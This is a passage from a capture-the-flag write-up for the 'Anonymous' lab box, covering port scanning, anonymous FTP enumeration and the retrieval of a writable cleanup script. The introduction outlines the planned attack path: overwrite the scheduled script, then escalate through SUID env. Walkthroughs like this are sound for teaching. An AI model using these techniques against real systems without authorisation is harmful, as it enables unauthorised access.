sections.label: Introduction
sections.html:
Today's target is Anonymous — a box that puts its own postmortem in writing before the engagement even starts. The to_do.txt file sitting in the FTP share is the sysadmin's own unaddressed risk assessment: anonymous FTP login is dangerous and needs disabling. It never got disabled. The writable scripts/ directory paired with a periodically-executed cleanup script is a textbook "writable file in a privileged execution chain" vulnerability, very similar in spirit to the Startup box earlier in this series — except here the scheduling mechanism doesn't even need to be inferred, since the box explicitly shows the log file growing in real time between FTP checks.

Prerequisites

Readers are assumed to know:

  • What anonymous FTP write access enables when paired with a periodically-executed script
  • How nano or any text editor can be used to overwrite a script's contents while preserving its execution context
  • What SUID env allows via GTFOBins (env <interpreter> <flags>)
  • Basic smbclient usage for SMB share enumeration

sections.label: Recon
sections.html:
(~0 mins into the box)

Port Scan

rustscan -a 10.48.171.146 -r 1-65535 --ulimit 5000 -b 500 -t 2000 -- -Pn -sV -sC -T4
PortServiceVersion
21/tcpFTPvsftpd 3.0.3 — anonymous allowed; scripts/ flagged writable by Nmap
22/tcpSSHOpenSSH 7.6p1 Ubuntu 4ubuntu0.3
139/tcp, 445/tcpSMBSamba smbd 4.7.6-Ubuntu

Nmap's ftp-anon script doesn't just confirm anonymous access — same as the Startup box — it flags the scripts subdirectory specifically as [NSE: writeable]. That detail alone defines the entire attack path before a single manual command is run.

Anonymous FTP

The FTP banner itself is a nice touch — *"NamelessOne's FTP Server!"* — directly naming the box's eventual user account before any enumeration even begins.

ftp 10.48.171.146
# Name: anonymous
ftp> cd scripts
ftp> ls
-rwxr-xrwx  clean.sh
-rw-rw-r--  removed_files.log
-rw-r--r--  to_do.txt

Downloading all three:

ftp> get clean.sh
ftp> get removed_files.log
ftp> get to_do.txt

clean.sh contents:

#!/bin/bash
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
    echo "Running cleanup script: nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log
